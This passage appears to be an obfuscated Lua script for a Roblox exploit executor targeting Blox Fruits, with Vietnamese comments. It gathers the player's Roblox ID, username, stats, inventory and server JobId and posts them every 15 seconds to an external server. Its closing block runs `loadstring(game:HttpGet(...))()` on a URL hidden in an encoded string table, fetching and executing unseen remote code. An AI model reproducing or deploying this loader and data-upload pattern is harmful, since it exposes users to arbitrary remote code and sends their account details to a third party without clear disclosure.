                    local lvlObj = tool:FindFirstChild(_0x3KG_STR[144]) or tool:FindFirstChild(_0x3KG_STR[147])
                    if lvlObj and lvlObj:IsA(_0x3KG_STR[165]) then
                        return lvlObj.Value
                    end
                    local attrLvl = tool:GetAttribute(_0x3KG_STR[144]) or tool:GetAttribute(_0x3KG_STR[147])
                    if attrLvl then return attrLvl end
                end
            end
        end
        return nil
    end

    local val = searchContainer(char) or searchContainer(bp)
    if val and tonumber(val) and tonumber(val) > 0 then
        return tonumber(val)
    end

    local pg = LocalPlayer:FindFirstChild(_0x3KG_STR[23])
    if pg then
        local main = pg:FindFirstChild(_0x3KG_STR[170])
        if main then
            for _, desc in ipairs(main:GetDescendants()) do
                if desc:IsA(_0x3KG_STR[31]) and desc.Visible and desc.Text ~= "" then
                    local masNum = string.match(desc.Text, _0x3KG_STR[329]) or string.match(desc.Text, _0x3KG_STR[330])
                    if masNum then
                        local n = tonumber(masNum)
                        if n and n > 0 then return n end
                    end
                end
            end
        end
    end

    return getVal(dataFolder, {toolType == _0x3KG_STR[290] and _0x3KG_STR[331] or _0x3KG_STR[332]}, 0)
end

-- 3. ĐỌC CHÍNH XÁC KIẾM ĐANG CẦM (CURRENT SWORD)
local function getEquippedSword()
    local char = LocalPlayer.Character
    local bp = LocalPlayer:FindFirstChild(_0x3KG_STR[183])
    
    local function searchSword(container)
        if not container then return nil end
        for _, tool in ipairs(container:GetChildren()) do
            if tool:IsA(_0x3KG_STR[255]) then
                local toolTip = tool.ToolTip
                local n = tool.Name
                
                -- ToolTip check
                if toolTip == _0x3KG_STR[325] then
                    return n
                end
                
                -- Name keyword check for known swords
                if n ~= _0x3KG_STR[252] and not string.find(n, _0x3KG_STR[270]) and not string.find(n, _0x3KG_STR[333]) and not string.find(n, _0x3KG_STR[334]) then
                    if string.find(n, _0x3KG_STR[326]) or string.find(n, _0x3KG_STR[49]) or string.find(n, _0x3KG_STR[327]) or string.find(n, _0x3KG_STR[335]) 
                    or string.find(n, _0x3KG_STR[336]) or string.find(n, _0x3KG_STR[337]) or string.find(n, _0x3KG_STR[338]) or string.find(n, _0x3KG_STR[339]) 
                    or string.find(n, _0x3KG_STR[340]) or string.find(n, _0x3KG_STR[341]) or string.find(n, _0x3KG_STR[342]) or string.find(n, _0x3KG_STR[343]) 
                    or string.find(n, _0x3KG_STR[344]) or string.find(n, _0x3KG_STR[345]) or string.find(n, _0x3KG_STR[328]) or string.find(n, _0x3KG_STR[346]) 
                    or string.find(n, _0x3KG_STR[347]) or string.find(n, _0x3KG_STR[188]) or string.find(n, _0x3KG_STR[348]) then
                        return n
                    end
                end
            end
        end
        return nil
    end

    local sw = searchSword(char) or searchSword(bp)
    if sw and sw ~= "" then return sw end

    -- Check Data folder
    local dataFolder = LocalPlayer:FindFirstChild(_0x3KG_STR[39])
    if dataFolder then
        local ds = getVal(dataFolder, {_0x3KG_STR[349], _0x3KG_STR[325]}, nil)
        if ds and ds ~= "" and ds ~= _0x3KG_STR[173] then return ds end
    end

    return _0x3KG_STR[173]
end

-- ĐỌC CHÍNH XÁC ĐÒN BẨY V4 (PULL LEVER / TEMPLE OF TIME LEVER)
local function checkPullLever(isV4)
    if isV4 == true then return true end

    if CommF_ then
        local ok, res = pcall(function()
            return CommF_:InvokeServer(_0x3KG_STR[240])
        end)
        if ok and (res == true or res == 1 or res == _0x3KG_STR[227]) then
            return true
        end
    end

    local df = LocalPlayer:FindFirstChild(_0x3KG_STR[39])
    if df then
        for _, name in ipairs({_0x3KG_STR[241], _0x3KG_STR[242], _0x3KG_STR[243], _0x3KG_STR[244], _0x3KG_STR[245]}) do
            local val = df:FindFirstChild(name)
            if val and (val.Value == true or val.Value == 1 or val.Value == _0x3KG_STR[227]) then
                return true
            end
        end
    end

    local attr = LocalPlayer:GetAttribute(_0x3KG_STR[242]) or LocalPlayer:GetAttribute(_0x3KG_STR[241]) or LocalPlayer:GetAttribute(_0x3KG_STR[243])
    if attr == true or attr == 1 then
        return true
    end

    if CommF_ then
        local remoteChecks = {
            {_0x3KG_STR[240]},
            {_0x3KG_STR[246]},
            {_0x3KG_STR[247]},
            {_0x3KG_STR[248]},
            {_0x3KG_STR[249], _0x3KG_STR[246]},
            {_0x3KG_STR[249], _0x3KG_STR[247]}
        }

        for _, args in ipairs(remoteChecks) do
            local ok, res = pcall(function()
                return CommF_:InvokeServer(unpack(args))
            end)
            if ok and res ~= nil then
                if res == true or res == 1 or res == _0x3KG_STR[250] or res == _0x3KG_STR[251] or (type(res) == _0x3KG_STR[4] and (res.Lever == true or res.Pulled == true)) then
                    return true
                end
            end
        end
    end

    return false
end

local SwordAliasMap = {
	[_0x3KG_STR[350]] = {_0x3KG_STR[350], _0x3KG_STR[351]},
	[_0x3KG_STR[337]]            = {_0x3KG_STR[337]},
	[_0x3KG_STR[336]]               = {_0x3KG_STR[336]},
	[_0x3KG_STR[335]]              = {_0x3KG_STR[335]},
	[_0x3KG_STR[264]]       = {_0x3KG_STR[264], _0x3KG_STR[327]},
	[_0x3KG_STR[352]] = {_0x3KG_STR[352], _0x3KG_STR[353]},
	[_0x3KG_STR[354]]      = {_0x3KG_STR[354], _0x3KG_STR[340]},
	[_0x3KG_STR[355]]        = {_0x3KG_STR[355], _0x3KG_STR[341]},
	[_0x3KG_STR[356]]     = {_0x3KG_STR[356]},
	[_0x3KG_STR[342]]            = {_0x3KG_STR[342]},
	[_0x3KG_STR[343]]          = {_0x3KG_STR[343]},
	[_0x3KG_STR[357]]        = {_0x3KG_STR[357]},
	[_0x3KG_STR[358]]    = {_0x3KG_STR[358], _0x3KG_STR[359]},
	[_0x3KG_STR[360]]    = {_0x3KG_STR[360], _0x3KG_STR[361], _0x3KG_STR[339]}
}

local GunAliasMap = {
	[_0x3KG_STR[362]]        = {_0x3KG_STR[362], _0x3KG_STR[363], _0x3KG_STR[328]},
	[_0x3KG_STR[364]]        = {_0x3KG_STR[364], _0x3KG_STR[365]},
	[_0x3KG_STR[366]]            = {_0x3KG_STR[366]},
	[_0x3KG_STR[367]]       = {_0x3KG_STR[367], _0x3KG_STR[368]},
	[_0x3KG_STR[369]]      = {_0x3KG_STR[369]},
	[_0x3KG_STR[370]]             = {_0x3KG_STR[370]},
	[_0x3KG_STR[371]]          = {_0x3KG_STR[371]},
	[_0x3KG_STR[372]]             = {_0x3KG_STR[372]},
	[_0x3KG_STR[373]]          = {_0x3KG_STR[373]}
}

-- 3. ĐỌC DANH SÁCH CÁC KIẾM & SÚNG ĐÃ SỞ HỮU KÈM THEO MASTERY
local function getOwnedWeaponMasteryMap(weaponType)
	local aliasMap = (weaponType == _0x3KG_STR[374]) and GunAliasMap or SwordAliasMap
	local ownedWeapons = {}
	local weaponMasteries = {}

	-- 1. Lấy dữ liệu lưu trữ từ Server qua Remote RF/GetAllItemValues
	pcall(function()
		local Net = ReplicatedStorage:FindFirstChild(_0x3KG_STR[303]) and ReplicatedStorage.Modules:FindFirstChild(_0x3KG_STR[304])
		local GetAllItemValues = Net and Net:FindFirstChild(_0x3KG_STR[305])

		if GetAllItemValues then
			local ok, playerValues = pcall(function() return GetAllItemValues:InvokeServer() end)
			if ok and type(playerValues) == _0x3KG_STR[4] then
				for _, entry in ipairs(playerValues) do
					if entry.ItemId then
						pcall(function()
							local ItemConfig = require(ReplicatedStorage.ItemConfig)
							local label = ItemConfig.match(entry.ItemId):unwrap().Index.DebugLabel
							if label then
								local clean = label:match(_0x3KG_STR[272]) or label
								for canon, aliases in pairs(aliasMap) do
									for _, alias in ipairs(aliases) do
										if clean == alias or clean:lower() == alias:lower() or string.find(clean:lower(), alias:lower()) then
											if entry.Key == _0x3KG_STR[306] and entry.Value == true then
												ownedWeapons[canon] = true
												if not weaponMasteries[canon] then weaponMasteries[canon] = 1 end
											elseif entry.Key == _0x3KG_STR[147] and type(entry.Value) == _0x3KG_STR[307] then
												ownedWeapons[canon] = true
												if not weaponMasteries[canon] or entry.Value > weaponMasteries[canon] then
													weaponMasteries[canon] = entry.Value
												end
											end
											break
										end
									end
								end
							end
						end)
					end
				end
			end
		end
	end)

	-- 2. Quét từ CommF_:InvokeServer(_0x3KG_STR[266])
	if CommF_ then
		pcall(function()
			local res = CommF_:InvokeServer(_0x3KG_STR[266])
			if type(res) == _0x3KG_STR[4] then
				for _, item in ipairs(res) do
					local name = item.Name or item.name or item.Id or item.itemId
					local mastery = tonumber(item.Mastery or item.mastery or item.Level or item.level) or 1
					if name then
						local nameStr = tostring(name)
						for canon, aliases in pairs(aliasMap) do
							for _, alias in ipairs(aliases) do
								if nameStr == alias or nameStr:lower() == alias:lower() or string.find(nameStr:lower(), alias:lower()) then
									ownedWeapons[canon] = true
									if not weaponMasteries[canon] or mastery > weaponMasteries[canon] then
										weaponMasteries[canon] = mastery
									end
									break
								end
							end
						end
					end
				end
			end
		end)
	end

	-- 3. Quét bổ sung từ Backpack và Character nếu đang trang bị
	local function scanContainer(container)
		if container then
			for _, item in ipairs(container:GetChildren()) do
				if item:IsA(_0x3KG_STR[255]) then
					local masObj = item:FindFirstChild(_0x3KG_STR[144]) or item:FindFirstChild(_0x3KG_STR[147])
					local masVal = (masObj and type(masObj.Value) == _0x3KG_STR[307]) and masObj.Value or 1

					for canonName, aliases in pairs(aliasMap) do
						for _, alias in ipairs(aliases) do
							if item.Name == alias or item.Name:lower() == alias:lower() or string.find(item.Name:lower(), alias:lower()) then
								ownedWeapons[canonName] = true
								if not weaponMasteries[canonName] or masVal > weaponMasteries[canonName] then
									weaponMasteries[canonName] = masVal
								end
							end
						end
					end
				end
			end
		end
	end

	scanContainer(LocalPlayer:FindFirstChild(_0x3KG_STR[183]))
	scanContainer(LocalPlayer.Character)

	-- 4. Tạo kết quả trả về
	local result = {}
	for name, isOwned in pairs(ownedWeapons) do
		if isOwned then
			table.insert(result, { name = name, count = 1, mastery = weaponMasteries[name] or 1 })
		end
	end

	return result
end

-- 4. ĐỌC CHÍNH XÁC RƯƠNG TRÁI ÁC QUỶ & VẬT PHẨM (TREASURE & INVENTORY WEAPONS)
local function getInventoryItems(equippedStyle, equippedSword, isV4)
    local inv = {}
    local ownedMap = {}

    if equippedSword and equippedSword ~= _0x3KG_STR[173] then
        ownedMap[equippedSword] = { count = 1, mastery = 1 }
    end
    if equippedStyle and equippedStyle ~= _0x3KG_STR[173] and equippedStyle ~= _0x3KG_STR[252] then
        ownedMap[equippedStyle] = { count = 1, mastery = 1 }
    end

    -- Check Lever Pulled status for V4 awakening
    if checkPullLever(isV4) then
        ownedMap[_0x3KG_STR[253]] = { count = 1, mastery = 0 }
        ownedMap[_0x3KG_STR[254]] = { count = 1, mastery = 0 }
    end

    -- Scan Backpack and Character tools for owned weapons, fruits, and accessories
    local containers = { LocalPlayer.Character, LocalPlayer:FindFirstChild(_0x3KG_STR[183]) }
    for _, c in ipairs(containers) do
        if c then
            for _, t in ipairs(c:GetChildren()) do
                if t:IsA(_0x3KG_STR[255]) and t.Name ~= "" then
                    local fruitCanon = cleanFruitName(t.Name)
                    if fruitCanon then
                        ownedMap[fruitCanon] = { count = 1, mastery = 0 }
                    else
                        local masObj = t:FindFirstChild(_0x3KG_STR[144]) or t:FindFirstChild(_0x3KG_STR[147])
                        local masVal = (masObj and type(masObj.Value) == _0x3KG_STR[307]) and masObj.Value or 1
                        ownedMap[t.Name] = { count = 1, mastery = masVal }
                    end
                end
            end
        end
    end

    -- Query ALL Blox Fruits Inventory Remotes (Weapons, Clothes/Accessories, Stash/Materials)
    if CommF_ then
        local remoteNames = { _0x3KG_STR[265], _0x3KG_STR[266], _0x3KG_STR[375], _0x3KG_STR[376], _0x3KG_STR[377] }
        for _, rName in ipairs(remoteNames) do
            local res = CommF_:InvokeServer(rName)
            if type(res) == _0x3KG_STR[4] then
                for _, item in ipairs(res) do
                    local name = item.Name or item.name or item.Id or item.itemId
                    local count = tonumber(item.Count or item.count or item.Value) or 1
                    local mastery = tonumber(item.Mastery or item.mastery or item.Level or item.level) or 0
                    if name and count > 0 then
                        name = tostring(name)
                        local canonFruit = cleanFruitName(name)
                        if canonFruit then
                            ownedMap[canonFruit] = { count = count, mastery = mastery }
                        else
                            ownedMap[name] = { count = count, mastery = mastery }
                        end
                        
                        local nLower = name:lower()
                        if string.find(nLower, _0x3KG_STR[257]) then
                            ownedMap[_0x3KG_STR[258]] = { count = 1, mastery = 0 }
                            ownedMap[_0x3KG_STR[259]] = { count = 1, mastery = 0 }
                        end
                        if string.find(nLower, _0x3KG_STR[260]) then
                            ownedMap[_0x3KG_STR[261]] = { count = 1, mastery = 0 }
                            ownedMap[_0x3KG_STR[262]] = { count = 1, mastery = 0 }
                        end
                        if string.find(nLower, _0x3KG_STR[263]) then
                            ownedMap[_0x3KG_STR[264]] = { count = count, mastery = mastery }
                        end
                    end
                end
            end
        end
    end

    -- Scan Character, Backpack, and Data for Mirror / Valkyrie
    local searchContainers = { LocalPlayer.Character, LocalPlayer:FindFirstChild(_0x3KG_STR[183]), LocalPlayer:FindFirstChild(_0x3KG_STR[39]) }
    for _, container in ipairs(searchContainers) do
        if container then
            for _, desc in ipairs(container:GetDescendants()) do
                local nLower = desc.Name:lower()
                if string.find(nLower, _0x3KG_STR[257]) then
                    ownedMap[_0x3KG_STR[258]] = { count = 1, mastery = 0 }
                    ownedMap[_0x3KG_STR[259]] = { count = 1, mastery = 0 }
                end
                if string.find(nLower, _0x3KG_STR[260]) then
                    ownedMap[_0x3KG_STR[261]] = { count = 1, mastery = 0 }
                    ownedMap[_0x3KG_STR[262]] = { count = 1, mastery = 0 }
                end
            end
        end
    end

    -- Query Fruit Inventory (ItemReplicationService - Exact User Implementation)
    pcall(function()
        local irs = ReplicatedStorage:FindFirstChild(_0x3KG_STR[378]) or (ReplicatedStorage:FindFirstChild(_0x3KG_STR[303]) and ReplicatedStorage.Modules:FindFirstChild(_0x3KG_STR[378]))
        local keysObj = irs and (irs:FindFirstChild(_0x3KG_STR[379]) or (ReplicatedStorage:FindFirstChild(_0x3KG_STR[378]) and ReplicatedStorage.ItemReplicationService:FindFirstChild(_0x3KG_STR[379])))
        local itemCfgObj = ReplicatedStorage:FindFirstChild(_0x3KG_STR[380])
        
        if irs and keysObj and itemCfgObj then
            local okIrs, ItemReplicationService = pcall(require, irs)
            local okKeys, KEYS = pcall(require, keysObj)
            local okCfg, ItemConfig = pcall(require, itemCfgObj)
            
            if okIrs and okKeys and okCfg and ItemReplicationService and KEYS and ItemConfig then
                local startWait = tick()
                while ItemReplicationService.IsInitialized ~= true and (tick() - startWait < 3) do
                    task.wait(0.1)
                end
                
                local function getItemName(itemId)
                    local ok, name = pcall(function()
                        return ItemConfig.match(itemId):unwrap().Index.DebugLabel
                    end)
                    if ok and name and name ~= "" then
                        return name
                    end
                    return tostring(itemId)
                end
                
                local keyTarget = KEYS.QUANTITY or KEYS.Quantity or KEYS.quantity
                local quantityItems = keyTarget and ItemReplicationService:GetItems(keyTarget)
                if quantityItems then
                    for _, item in pairs(quantityItems) do
                        local val = tonumber(item.Value or item.Count) or 0
                        if val > 0 and item.ItemId then
                            local rawName = getItemName(item.ItemId)
                            local fruitCanonName = cleanFruitName(rawName)
                            if fruitCanonName then
                                ownedMap[fruitCanonName] = { count = val, mastery = 0 }
                            else
                                ownedMap[rawName] = { count = val, mastery = 0 }
                            end
                            
                            local nLower = tostring(rawName):lower()
                            if string.find(nLower, _0x3KG_STR[257]) or string.find(nLower, _0x3KG_STR[381]) then
                                ownedMap[_0x3KG_STR[258]] = { count = 1, mastery = 0 }
                                ownedMap[_0x3KG_STR[259]] = { count = 1, mastery = 0 }
                            end
                            if string.find(nLower, _0x3KG_STR[260]) then
                                ownedMap[_0x3KG_STR[261]] = { count = 1, mastery = 0 }
                                ownedMap[_0x3KG_STR[262]] = { count = 1, mastery = 0 }
                            end
                        end
                    end
                end
            end
        end
    end)

    -- Ghép thêm danh sách Võ đã sở hữu qua Remote kèm Mastery
    local ownedMelees = getOwnedMelees(equippedStyle)
    for _, m in ipairs(ownedMelees) do
        if not ownedMap[m.name] or (ownedMap[m.name].mastery or 0) < (m.mastery or 0) then
            ownedMap[m.name] = { count = m.count or 1, mastery = m.mastery or 0 }
        end
    end

    -- Ghép thêm danh sách Kiếm & Súng đã sở hữu qua Remote kèm Mastery
    local ownedSwords = getOwnedWeaponMasteryMap(_0x3KG_STR[325])
    for _, s in ipairs(ownedSwords) do
        if not ownedMap[s.name] or (ownedMap[s.name].mastery or 0) < (s.mastery or 0) then
            ownedMap[s.name] = { count = s.count or 1, mastery = s.mastery or 0 }
        end
    end

    local ownedGuns = getOwnedWeaponMasteryMap(_0x3KG_STR[374])
    for _, g in ipairs(ownedGuns) do
        if not ownedMap[g.name] or (ownedMap[g.name].mastery or 0) < (g.mastery or 0) then
            ownedMap[g.name] = { count = g.count or 1, mastery = g.mastery or 0 }
        end
    end

    for itemName, data in pairs(ownedMap) do
        if type(data) == _0x3KG_STR[4] then
            table.insert(inv, { name = itemName, count = data.count or 1, mastery = data.mastery or 0 })
        else
            table.insert(inv, { name = itemName, count = data, mastery = 0 })
        end
    end

    return inv
end

-- 5. THU THẬP THÔNG SỐ TỔNG HỢP
local function collectStats()
    local df = LocalPlayer:FindFirstChild(_0x3KG_STR[39]) or LocalPlayer
    local ls = LocalPlayer:FindFirstChild(_0x3KG_STR[40])
    
    local level = getVal(ls, {_0x3KG_STR[144]}, 0)
    if level == 0 then level = getVal(df, {_0x3KG_STR[144]}, 0) end
    if level == 0 then
        local pg = LocalPlayer:FindFirstChild(_0x3KG_STR[23])
        if pg then
            local main = pg:FindFirstChild(_0x3KG_STR[170])
            if main then
                for _, desc in ipairs(main:GetDescendants()) do
                    if desc:IsA(_0x3KG_STR[31]) and desc.Visible then
                        local lvlMatch = string.match(desc.Text, _0x3KG_STR[382]) or string.match(desc.Text, _0x3KG_STR[383])
                        if lvlMatch then
                            level = tonumber(lvlMatch) or 0
                            if level > 0 then break end
                        end
                    end
                end
            end
        end
    end
    
    local bounty, honor = getBountyAndHonor()
    
    local beli = getVal(ls, {_0x3KG_STR[148]}, 0)
    if beli == 0 then beli = getVal(df, {_0x3KG_STR[148]}, 0) end
    if beli == 0 then beli = getVal(ls, {_0x3KG_STR[384]}, 0) end
    if beli == 0 then beli = getVal(df, {_0x3KG_STR[384]}, 0) end
    
    local fragments = getVal(ls, {_0x3KG_STR[149]}, 0)
    if fragments == 0 then fragments = getVal(df, {_0x3KG_STR[149]}, 0) end
    if fragments == 0 then fragments = getVal(ls, {_0x3KG_STR[385]}, 0) end
    if fragments == 0 then fragments = getVal(df, {_0x3KG_STR[385]}, 0) end
    
    local equippedFightingStyle = getEquippedMelee()
    local equippedSword = getEquippedSword()
    local equippedFruit = getEquippedFruit()
    local fsMastery = getToolMastery(_0x3KG_STR[290])
    local swMastery = getToolMastery(_0x3KG_STR[325])
    local raceName, raceV2, raceV3, raceV4, raceV4Tier = getRaceAndVersion()
    local inventoryItems = getInventoryItems(equippedFightingStyle, equippedSword, raceV4)

    local seaName = (function()
        local pid = game.PlaceId
        if pid == 7449423635 or pid == 100117331123089 then return _0x3KG_STR[386] end
        if pid == 4442272183 then return _0x3KG_STR[387] end
        if pid == 2753915549 then return _0x3KG_STR[388] end
        if level >= 1500 then return _0x3KG_STR[386] end
        if level >= 700 then return _0x3KG_STR[387] end
        if df then
            local sVal = df:FindFirstChild(_0x3KG_STR[389]) or df:FindFirstChild(_0x3KG_STR[390])
            if sVal and sVal:IsA(_0x3KG_STR[165]) then
                local sTxt = tostring(sVal.Value)
                if string.find(sTxt, _0x3KG_STR[220]) or string.find(sTxt, _0x3KG_STR[391]) then return _0x3KG_STR[386] end
                if string.find(sTxt, _0x3KG_STR[222]) or string.find(sTxt, _0x3KG_STR[392]) then return _0x3KG_STR[387] end
            end
        end
        return _0x3KG_STR[388]
    end)()

local function getStatValue(statName)
    local df = LocalPlayer:FindFirstChild(_0x3KG_STR[39]) or LocalPlayer
    local statsFolder = df:FindFirstChild(_0x3KG_STR[393]) or LocalPlayer:FindFirstChild(_0x3KG_STR[393])

    local possibleNames = { statName, statName:lower() }
    if statName == _0x3KG_STR[394] or statName == _0x3KG_STR[395] or statName == _0x3KG_STR[396] then
        possibleNames = { _0x3KG_STR[397], _0x3KG_STR[398], _0x3KG_STR[271], _0x3KG_STR[394], _0x3KG_STR[270], _0x3KG_STR[269], _0x3KG_STR[399] }
    elseif statName == _0x3KG_STR[290] then
        possibleNames = { _0x3KG_STR[290], _0x3KG_STR[400], _0x3KG_STR[252] }
    elseif statName == _0x3KG_STR[401] then
        possibleNames = { _0x3KG_STR[401], _0x3KG_STR[402] }
    elseif statName == _0x3KG_STR[325] then
        possibleNames = { _0x3KG_STR[325], _0x3KG_STR[403] }
    elseif statName == _0x3KG_STR[374] then
        possibleNames = { _0x3KG_STR[374], _0x3KG_STR[404] }
    end

    if statsFolder then
        for _, pName in ipairs(possibleNames) do
            local sObj = statsFolder:FindFirstChild(pName)
            if sObj then
                if sObj:FindFirstChild(_0x3KG_STR[144]) then
                    local ok, v = pcall(function() return sObj.Level.Value end)
                    if ok and v ~= nil then return tonumber(v) or 0 end
                end
                local ok, v = pcall(function() return sObj.Value end)
                if ok and v ~= nil then return tonumber(v) or 0 end
            end
        end
    end

    for _, pName in ipairs(possibleNames) do
        local val = getVal(df, {_0x3KG_STR[393], pName}, nil) or getVal(df, {pName}, nil)
        if val ~= nil and tonumber(val) then return tonumber(val) end
    end

    return 0
end

    return {
        robloxId = tostring(LocalPlayer.UserId),
        username = LocalPlayer.Name,
        displayName = LocalPlayer.DisplayName,
        
        level = level,
        bounty = bounty,
        honor = honor,
        beli = beli,
        fragments = fragments,
        
        race = raceName,
        raceV2 = raceV2,
        raceV3 = raceV3,
        raceV4 = raceV4,
        raceV4Tier = raceV4Tier,
        
        fruit = equippedFruit,
        fruitAwakened = getVal(df, {_0x3KG_STR[405]}, false),
        
        melee = getStatValue(_0x3KG_STR[290]),
        defense = getStatValue(_0x3KG_STR[401]),
        sword = getStatValue(_0x3KG_STR[325]),
        gun = getStatValue(_0x3KG_STR[374]),
        bloxFruit = getStatValue(_0x3KG_STR[394]),
        
        fightingStyle = equippedFightingStyle,
        fightingStyleMastery = fsMastery,
        currentSword = equippedSword,
        swordMastery = swMastery,
        inventory = inventoryItems,
        
        kills = getVal(df, {_0x3KG_STR[406]}, 0),
        deaths = getVal(df, {_0x3KG_STR[407]}, 0),
        sea = seaName,
        questsCompleted = getVal(df, {_0x3KG_STR[408]}, 0),
        bossesDefeated = getVal(df, {_0x3KG_STR[409]}, 0),
        
        userKey = API_KEY,
        pcName = PC_NAME,
        timestamp = os.time(),
        serverJobId = game.JobId,
    }
end

local lastStatHash = ""
local lastSyncTime = 0

local function computeStatHash(stats)
    return tostring(stats.level) .. _0x3KG_STR[410] .. tostring(stats.bounty) .. _0x3KG_STR[410] .. tostring(stats.beli) .. _0x3KG_STR[410] .. tostring(stats.fragments) .. _0x3KG_STR[410] .. tostring(stats.fruit) .. _0x3KG_STR[410] .. tostring(stats.race) .. _0x3KG_STR[410] .. tostring(stats.fightingStyle) .. _0x3KG_STR[410] .. tostring(stats.currentSword)
end

local function sendSync(force)
    if not LocalPlayer or not LocalPlayer.Team or LocalPlayer.Team.Name == "" or LocalPlayer.Team.Name == _0x3KG_STR[41] then
        updateToastStatus(_0x3KG_STR[411], false)
        return
    end

    local ok, stats = pcall(collectStats)
    if not ok or not stats then
        updateToastStatus(_0x3KG_STR[412], false)
        return
    end

    local currentHash = computeStatHash(stats)
    local now = os.time()

    -- Smart Sync: Nếu stats không đổi và đã sync gần đây (<30s), bỏ qua HTTP POST thừa để tiết kiệm CPU Roblox & Server
    if not force and currentHash == lastStatHash and (now - lastSyncTime < 30) then
        updateToastStatus(_0x3KG_STR[35] .. tostring(PC_NAME) .. _0x3KG_STR[36], false)
        return
    end

    local success, response = safeHttpRequest({
        Url = SERVER_URL .. _0x3KG_STR[413],
        Method = _0x3KG_STR[12],
        Headers = {
            [_0x3KG_STR[16]] = _0x3KG_STR[13],
            [_0x3KG_STR[17]] = API_KEY,
            [_0x3KG_STR[18]] = API_KEY
        },
        Body = HttpService:JSONEncode({ player = stats, gameId = tostring(game.PlaceId) })
    })

    if success and response and (response.StatusCode == 200 or response.StatusCode == 201) then
        lastStatHash = currentHash
        lastSyncTime = now
        updateToastStatus(_0x3KG_STR[35] .. tostring(PC_NAME) .. _0x3KG_STR[36], false)
        print(_0x3KG_STR[414] .. tostring(stats.level or 0))
    else
        updateToastStatus(_0x3KG_STR[415], false)
    end

    -- Giải phóng bộ nhớ đệm Roblox Executor (Roblox Memory Optimization)
    pcall(function() collectgarbage(_0x3KG_STR[416], 100) end)
end

-- Gửi 1 lần ngay sau khi chọn Team & nạp xong
task.spawn(function()
    pcall(function() sendSync(true) end)
end)

-- Vòng lặp giữ trạng thái ONLINE ngầm thông minh (Smart Interval 15s check)
task.spawn(function()
    while true do
        task.wait(15)
        pcall(function() sendSync(false) end)
    end
end)

-- Nạp API phụ trợ bên ngoài (External API Script execution)
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet(_0x3KG_STR[417]))()
    end)
end)